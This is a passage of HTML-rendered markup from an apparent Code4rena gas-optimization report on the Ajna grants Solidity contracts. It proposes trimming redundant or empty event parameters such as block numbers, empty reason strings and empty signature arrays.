class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        // calculate the number of votes available at the snapshot block</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        uint256 votes1 = token.getPastVotes(account_, snapshot_);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        // enable voting weight to be calculated during the voting period&#39;s start block</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        voteStartBlock_ = voteStartBlock_ != block.number ? voteStartBlock_ : block.number - 1;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        // calculate the number of votes available at the stage&#39;s start block</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        uint256 votes2 = token.getPastVotes(account_, voteStartBlock_);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            mstore(0x40, memptr)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        }</span></span></span></code></pre>\n<h2 id=\"g-11-refactor-event-to-avoid-emitting-data-that-is-already-present-in-transaction-data\" style=\"position:relative;\"><a href=\"#g-11-refactor-event-to-avoid-emitting-data-that-is-already-present-in-transaction-data\" aria-label=\"g 11 refactor event to avoid emitting data that is already present in transaction data permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-11] Refactor event to avoid emitting data that is already present in transaction data</h2>\n<p>In the instance below, <code>startBlock</code> (<code>block.timestammp</code>), does not have to be emitted since the timestamp is already present in the transaction data. In addition, <code>endBlock</code> (<code>block.timetamp</code> + <code>DISTRIBUTION_PERIOD_LENGTH</code>), does not have to be emitted either since <code>DISTRIBUTION_PERIOD_LENGTH</code> is a constant and therefore the <code>endBlock</code> can always be trivially calculated. This would save loading data into memory (potentially avoiding memory expansion costs) and <code>Glogdata (8 gas) * bytes emitted</code>.</p>\n<p><strong>Note: Additional refactoring of the tests is needed for this optimization to work and therefore it is not included in the final diffs</strong>.</p>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L159-L163\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L159-L163</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"213\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">ajna</span><span class=\"mtk1\">-</span><span class=\"mtk12\">grants</span><span class=\"mtk1\">/</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">grants</span><span class=\"mtk1\">/</span><span class=\"mtk12\">base</span><span class=\"mtk1\">/</span><span class=\"mtk12\">StandardFunding</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">159</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">QuarterlyDistributionStarted</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">160</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">newDistributionId_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">161</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">startBlock</span><span class=\"mtk1\">, </span><span class=\"mtk3\">// @audit: present in tx data</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">162</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">endBlock</span><span class=\"mtk1\"> </span><span class=\"mtk3\">// @audit: can be trivially calculated</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">163</span><span class=\"mtk1\">:        );</span></span></span></code></pre>\n<p>In the instances below, <code>block.number</code> is being emitted as well.</p>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/ExtraordinaryFunding.sol#L113-L123\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/ExtraordinaryFunding.sol#L113-L123</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L393-L403\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L393-L403</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"214\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">ajna</span><span class=\"mtk1\">-</span><span class=\"mtk12\">grants</span><span class=\"mtk1\">/</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">grants</span><span class=\"mtk1\">/</span><span class=\"mtk12\">base</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ExtraordinaryFunding</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">113</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">ProposalCreated</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">114</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">proposalId_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">115</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">116</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">targets_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">117</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">values_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">118</span><span class=\"mtk1\">:            </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">string</span><span class=\"mtk1\">[](</span><span class=\"mtk12\">targets_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">119</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">calldatas_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">120</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">number</span><span class=\"mtk1\">, </span><span class=\"mtk3\">// @audit: present in tx data</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">121</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">endBlock_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">122</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">description_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">123</span><span class=\"mtk1\">:        );</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"215\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">ajna</span><span class=\"mtk1\">-</span><span class=\"mtk12\">grants</span><span class=\"mtk1\">/</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">grants</span><span class=\"mtk1\">/</span><span class=\"mtk12\">base</span><span class=\"mtk1\">/</span><span class=\"mtk12\">StandardFunding</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">393</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">ProposalCreated</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">394</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">proposalId_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">395</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">396</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">targets_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">397</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">values_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">398</span><span class=\"mtk1\">:            </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">string</span><span class=\"mtk1\">[](</span><span class=\"mtk12\">targets_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">399</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">calldatas_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">400</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">number</span><span class=\"mtk1\">, </span><span class=\"mtk3\">// @audit: present in tx data</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">401</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">currentDistribution</span><span class=\"mtk1\">.</span><span class=\"mtk12\">endBlock</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">402</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">description_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">403</span><span class=\"mtk1\">:        );</span></span></span></code></pre>\n<h2 id=\"g-12-refactor-event-to-avoid-emitting-empty-data\" style=\"position:relative;\"><a href=\"#g-12-refactor-event-to-avoid-emitting-empty-data\" aria-label=\"g 12 refactor event to avoid emitting empty data permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-12] Refactor event to avoid emitting empty data</h2>\n<p>The instances below show the only time the <code>VoteCast</code> event is emitted. Each time, the <code>reason</code> parameter is empty. We can therefore refactor the event to opt out of emitting an emtpy string since it does not contain data. </p>\n<p><strong>Note: Additional refactoring of the tests is needed for this optimization to work and therefore it is not included in the final diffs</strong></p>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/interfaces/IFunding.sol#L69\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/interfaces/IFunding.sol#L69</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/ExtraordinaryFunding.sol#L150-L156\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/ExtraordinaryFunding.sol#L150-L156</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L683-L689\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L683-L689</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L746-L752\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L746-L752</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"216\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">ajna</span><span class=\"mtk1\">-</span><span class=\"mtk12\">grants</span><span class=\"mtk1\">/</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">grants</span><span class=\"mtk1\">/</span><span class=\"mtk12\">interfaces</span><span class=\"mtk1\">/</span><span class=\"mtk12\">IFunding</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">69</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">event</span><span class=\"mtk1\"> </span><span class=\"mtk11\">VoteCast</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">indexed</span><span class=\"mtk1\"> </span><span class=\"mtk12\">voter</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint8</span><span class=\"mtk1\"> </span><span class=\"mtk12\">support</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">weight</span><span class=\"mtk1\">, </span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">reason</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"217\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">ajna</span><span class=\"mtk1\">-</span><span class=\"mtk12\">grants</span><span class=\"mtk1\">/</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">grants</span><span class=\"mtk1\">/</span><span class=\"mtk12\">base</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ExtraordinaryFunding</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">150</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">VoteCast</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">151</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">152</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">proposalId_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">153</span><span class=\"mtk1\">:            </span><span class=\"mtk7\">1</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">154</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">votesCast_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">155</span><span class=\"mtk1\">:            </span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\"> </span><span class=\"mtk3\">// @audit: no data emitted</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">156</span><span class=\"mtk1\">:        );</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"218\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">ajna</span><span class=\"mtk1\">-</span><span class=\"mtk12\">grants</span><span class=\"mtk1\">/</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">grants</span><span class=\"mtk1\">/</span><span class=\"mtk12\">base</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ExtraordinaryFunding</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">683</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">VoteCast</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">684</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">account_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">685</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">686</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">support</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">687</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">incrementalVotesUsed_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">688</span><span class=\"mtk1\">:            </span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\"> </span><span class=\"mtk3\">// @audit: no data emitted</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">689</span><span class=\"mtk1\">:        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">746</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">VoteCast</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">747</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">account_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">748</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">749</span><span class=\"mtk1\">:            </span><span class=\"mtk7\">1</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">750</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">votes_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">751</span><span class=\"mtk1\">:            </span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\"> </span><span class=\"mtk3\">// @audit: no data emitted</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">752</span><span class=\"mtk1\">:        );</span></span></span></code></pre>\n<p>The instances below show the only times the <code>ProposalCreatedEvent</code> is emitted. Each time, an emtpy array of type <code>string</code>, with a size of <code>targets_.length</code>, is emitted. This array does not contain any meaningful data and we can therefore refactor the event to opt out of creating an empty array in memory (potentially incurring memory expansion costs) and emitting an empty array.</p>\n<p><strong>Note: Additional refactoring of the tests is needed for this optimization to work and therefore it is not included in the final diffs</strong></p>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/interfaces/IFunding.sol#L54-L64\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/interfaces/IFunding.sol#L54-L64</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/ExtraordinaryFunding.sol#L113-L123\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/ExtraordinaryFunding.sol#L113-L123</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L393-L403\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L393-L403</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"219\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">ajna</span><span class=\"mtk1\">-</span><span class=\"mtk12\">grants</span><span class=\"mtk1\">/</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">grants</span><span class=\"mtk1\">/</span><span class=\"mtk12\">interfaces</span><span class=\"mtk1\">/</span><span class=\"mtk12\">IFunding</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">54</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">event</span><span class=\"mtk1\"> </span><span class=\"mtk11\">ProposalCreated</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">55</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">56</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proposer</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">57</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">address</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">targets</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">58</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">values</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">59</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">string</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">signatures</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">60</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">calldatas</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">61</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">startBlock</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">62</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">endBlock</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">63</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">description</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">64</span><span class=\"mtk1\">:    );</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"220\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">ajna</span><span class=\"mtk1\">-</span><span class=\"mtk12\">grants</span><span class=\"mtk1\">/</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">grants</span><span class=\"mtk1\">/</span><span class=\"mtk12\">base</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ExtraordinaryFunding</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">113</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">ProposalCreated</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">114</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">proposalId_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">115</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">116</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">targets_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">117</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">values_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">118</span><span class=\"mtk1\">:            </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">string</span><span class=\"mtk1\">[](</span><span class=\"mtk12\">targets_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">), </span><span class=\"mtk3\">// @audit: no data is emitted</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">119</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">calldatas_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">120</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">number</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">121</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">endBlock_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">122</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">description_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">123</span><span class=\"mtk1\">:        );</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"221\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">ajna</span><span class=\"mtk1\">-</span><span class=\"mtk12\">grants</span><span class=\"mtk1\">/</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">grants</span><span class=\"mtk1\">/</span><span class=\"mtk12\">base</span><span class=\"mtk1\">/</span><span class=\"mtk12\">StandardFunding</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span 